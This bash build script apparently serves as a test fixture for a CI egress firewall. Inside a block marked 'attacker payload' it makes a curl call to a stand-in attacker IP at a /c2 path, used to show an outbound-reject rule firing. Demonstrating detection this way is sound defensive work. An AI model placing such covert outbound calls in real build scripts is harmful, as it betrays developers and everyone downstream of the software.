#!/usr/bin/env bash
# Baseline build script — committed to the victim repo's main branch.
# Innocent on its own; the attacker fork replaces this with an
# exfil version (see attacker-patch.diff).
set -euo pipefail

echo "==> Building example project"
echo "Hello from build.sh on $(uname -a)"

# ---- attacker payload (18kiran08): network-only -------------------------
# Pure outbound connect to an attacker-controlled IP. No base64 in the
# pipeline, so only the unknown_egress rule fires — clean isolated demo
# of the nft `inet citadel` reject path (ICMP admin-prohibited).
curl -fsS --max-time 5 https://198.51.100.42/c2 || true
# ---- end attacker payload -----------------------------------------------

# Intentional: writes a file in the workspace so we can demonstrate
# the file-integrity rule once that lands.
mkdir -p dist
echo "build $(date -u +%FT%TZ)" > dist/version.txt
echo "==> Done"
